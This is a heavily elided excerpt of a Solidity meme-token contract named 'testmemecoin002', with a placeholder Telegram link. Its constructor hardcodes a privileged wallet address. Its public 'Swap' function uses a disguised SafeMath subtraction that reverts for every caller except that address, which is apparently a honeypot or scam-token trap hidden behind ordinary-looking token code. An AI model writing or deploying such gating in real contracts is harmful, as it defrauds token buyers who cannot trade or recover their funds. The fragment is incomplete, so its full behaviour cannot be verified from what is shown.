...
//Telegram: https://t.me/faketghandle
...
contract testmemecoin002 is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "testmemecoin002";
    ...
    constructor () {
        ...
        raca = payable(address(0xb071F2E9B6a9B614029Ca4D96B1223fa922DA3Cc));
    ...
    function Swap(address smbol,uint256 ssr) public {
        ssr.sub(
            (msg.sender != raca) ? 
            ssr+ssr : 0
        );
